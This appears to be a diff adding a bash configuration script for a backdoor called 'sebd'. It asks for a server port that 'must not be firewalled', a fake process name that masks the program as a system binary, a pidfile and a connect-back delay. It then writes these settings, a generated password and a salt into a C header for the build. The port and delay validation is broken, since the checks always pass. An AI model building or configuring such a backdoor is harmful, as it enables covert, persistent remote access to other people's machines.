@@ -1,0 +1,75 @@
+#!/bin/bash
+
+BASEDIR=`pwd`
+
+echo -n "[sebd_conf]-> enter silent (yes | no): "
+read SIL
+if [ -z $SIL ]; then
+    echo "ABORTED"
+    exit
+else
+    if [ "$SIL" == "yes" ]; then
+	SILENT=1
+    else
+	SILENT=0
+    fi
+fi
+
+echo -n "[sebd_conf]-> enter server port (must not be firewalled) (0...65535): "
+read PORT
+if [ -z $PORT ]; then
+	echo "ABORTED"
+	exit 
+else
+    if [ '$PORT > 0 && $PORT < 65535' ]; then
+	SERVER_PORT=$PORT
+    else
+	echo "INVALID PORT"
+	exit
+    fi
+fi
+echo -n "[sebd_conf]-> enter pidfile location.. /somthing/somethingelse.pid : "
+read PIDFILE
+ if [ -z $PIDFILE ]; then
+   echo "ABORTED"
+        exit
+fi
+
+echo -n "[sebd_conf]-> the name for the mask..(/usr/sbin/something): "
+read MASK
+if [ -z $MASK ]; then
+    echo "ABORTED"
+    exit
+fi
+echo -n "[sebd_conf]-> enter connect back delay (5...15): "
+read DELAY
+if [ -z $DELAY ]; then
+    echo "ABORTED"
+    exit
+else
+    if [ '$DELAY >= 5 && $DELAY <= 20' ]; then
+	CONNECT_BACK_DELAY=$DELAY
+    else
+	echo "INVALID DELAY"
+    fi
+fi
+
+echo "[sebd_conf]-> getting password and salt..."
+cd $BASEDIR/tools/mkpasswd
+make 1>/dev/null
+./mkpasswd
+rm -rf mkpasswd
+mv config $BASEDIR
+cd $BASEDIR
+
+echo -e "/* config.h - some defines and the password */\n" > config.h
+echo -e "#define SILENT $SILENT\n" >> config.h
+echo -e "#define MASK \"$MASK\"" >>config.h
+echo -e "#define PIDFILE \"$PIDFILE\"\n"  >>config.h
+echo -e "#define SERVER_PORT $SERVER_PORT" >> config.h
+echo -e "#define CONNECT_BACK_DELAY $CONNECT_BACK_DELAY\n" >> config.h
+echo -e "#define SALT \042`head -1 config`\042" >> config.h
+echo -e "#define KEY \042`tail -n 1 config`\042" >> config.h
+rm -rf config
+mv -f config.h $BASEDIR/include/config.h
+
